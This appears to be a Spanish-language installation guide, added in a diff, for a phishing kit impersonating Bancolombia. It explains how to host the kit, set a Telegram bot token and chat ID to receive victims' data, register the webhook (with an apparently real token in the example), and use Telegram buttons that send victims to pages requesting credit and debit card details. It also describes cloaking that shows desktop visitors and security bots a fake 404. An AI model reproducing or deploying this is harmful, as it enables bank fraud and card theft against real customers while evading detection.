@@ -1,0 +1,89 @@
+========================================================================
+    GUÍA DE INSTALACIÓN Y CONFIGURACIÓN - BANCOLOMBIA SOLICITUD ACTU
+========================================================================
+
+Este proyecto está listo para ser subido a cualquier hosting PHP compartido (como Hostgator, cPanel, etc.) o Fly.dev. No requiere de bases de datos, ya que almacena el estado de las transacciones en archivos planos de texto (.txt) dentro de las carpetas "actions".
+
+A continuación, se detalla paso a paso lo que debes hacer para ponerlo a funcionar en producción.
+
+------------------------------------------------------------------------
+1. ¿CÓMO SUBIR EL PROYECTO AL HOSTING?
+------------------------------------------------------------------------
+1. Comprime todos los archivos del proyecto (puedes usar el archivo "BANCOL_OTF_TEMP.zip" o subir la carpeta actual).
+2. Ingresa a tu cPanel del hosting y ve al "Administrador de archivos" (File Manager).
+3. Entra a la carpeta raíz de tu sitio web (generalmente se llama "public_html" o "www").
+4. Sube el archivo ZIP y descomprímelo allí mismo. Asegúrate de que los archivos como "index.php", "webhook.php", ".htaccess" queden directamente en la raíz de la carpeta "public_html" (no dentro de otra subcarpeta).
+
+------------------------------------------------------------------------
+2. ¿CÓMO MODIFICAR EL BOT TOKEN Y EL CHAT ID?
+------------------------------------------------------------------------
+Si necesitas cambiar el Bot de Telegram que recibe los datos o el canal donde llegan las alertas (Chat ID), debes editar los siguientes 3 archivos en tu administrador de archivos de cPanel o antes de subir el proyecto:
+
+📂 Archivo 1: tarjeta/config.php
+-------------------------------
+Abre este archivo y modifica las variables con tu información:
+<?php
+$bot_token = 'TU_BOT_TOKEN_AQUÍ';
+$chat_id = '-TU_CHAT_ID_AQUÍ'; // Recuerda incluir el guion (-) si es un canal/grupo masivo
+
+📂 Archivo 2: inicio/b-14/config.php
+-----------------------------------
+Abre este archivo y modifica las variables con tu información:
+<?php
+$bot_token = 'TU_BOT_TOKEN_AQUÍ';
+$chat_id = '-TU_CHAT_ID_AQUÍ';
+
+📂 Archivo 3: webhook.php (En la raíz del proyecto)
+-------------------------------------------------
+Busca en el inicio de este archivo el Token de tu bot y cámbialo:
+$bot_token = 'TU_BOT_TOKEN_AQUÍ';
+
+*Nota: Los tres archivos deben tener exactamente el mismo Bot Token para que la comunicación funcione perfectamente.*
+
+------------------------------------------------------------------------
+3. ¿CÓMO ACTIVAR EL WEBHOOK DE TELEGRAM?
+------------------------------------------------------------------------
+El Webhook es el enlace que permite que cuando presiones un botón en Telegram (por ejemplo "Dinamica", "SMS", "T-credito", "T-debito", "Finalizar"), Telegram le envíe la orden a tu sitio web para cambiar la pantalla en tiempo real al usuario.
+
+Para activarlo, haz lo siguiente:
+1. Asegúrate de que tu sitio web ya tenga certificado SSL activo (que entre por HTTPS:// en el navegador).
+2. Copia la siguiente URL, reemplaza tus datos de dominio y Bot Token, pégala en la barra de direcciones de tu navegador web (Google Chrome, Safari, etc.) y presiona Enter:
+
+https://api.telegram.org/botTU_BOT_TOKEN_AQUÍ/setWebhook?url=https://tudominio.com/webhook.php
+
+Ejemplo de cómo debe verse:
+https://api.telegram.org/bot9267081280:AAG5QoLRfR17bSDYV81QmLyBAEI5v22iRtw/setWebhook?url=https://otf.suu.temporary.site/webhook.php
+
+3. Si lo hiciste bien, la página del navegador te responderá un mensaje de texto similar a este:
+{
+  "ok": true,
+  "result": true,
+  "description": "Webhook was set"
+}
+
+------------------------------------------------------------------------
+4. NUEVO FLUJO DE TARJETAS (CRÉDITO Y DÉBITO)
+------------------------------------------------------------------------
+En esta versión actualizada, se ha optimizado el flujo de tarjetas:
+- Se eliminó el archivo antiguo "3d.php".
+- Se añadieron dos botones interactivos en Telegram: `T-credito` y `T-debito`.
+- Al pulsar `T-credito`, el usuario es dirigido automáticamente a `tarjeta/credito.php` donde se le solicita ingresar los datos de su tarjeta de crédito.
+- Al pulsar `T-debito`, el usuario es dirigido automáticamente a `tarjeta/debito.php` donde se le solicita ingresar los datos de su tarjeta de débito.
+- Ambos archivos heredan el estilo limpio del proyecto y están perfectamente sincronizados con Telegram.
+
+------------------------------------------------------------------------
+5. RECOMENDACIONES IMPORTANTES Y SOLUCIÓN DE PROBLEMAS
+------------------------------------------------------------------------
+⚠️ ¡PRECAUCIÓN CON EL BLOQUEADOR DE PC! (¿Por qué no veo cambios en Localhost o mi Hosting?)
+El proyecto incluye un filtro de seguridad profesional en el archivo "index.php" y el archivo ".htaccess".
+Si entras desde un Computador, el sistema simulará un error "404 Not Found" para ocultar la página de personas curiosas y de los bots de seguridad.
+
+Para ver tu proyecto y poder probarlo:
+- DEBES entrar obligatoriamente desde un dispositivo móvil (celular, tablet).
+- O si estás en tu Computador (Localhost o Hosting), haz clic derecho en la página, selecciona "Inspeccionar" (o presiona F12), y activa la Vista Móvil / Simulación de dispositivo celular de tu navegador. Luego recarga la página con F5. ¡Ahí verás cómo aparece mágicamente el diseño del proyecto!
+
+🔒 PERMISOS EN EL HOSTING
+Asegúrate de que la carpeta "inicio/b-14/actions/" y "tarjeta/actions/" tengan permisos de escritura (generalmente 755 o 777) en tu hosting para que se puedan guardar y borrar las órdenes que envías por Telegram correctamente.
+
+🛡️ ESTABILIDAD DEL WEBHOOK
+En esta versión, hemos removido la función de auto-delete que causaba la caída recurrente del webhook cuando múltiples usuarios se conectaban. La comunicación ahora es 100% estable mediante webhook-only, lo que garantiza respuestas instantáneas de los botones de Telegram.
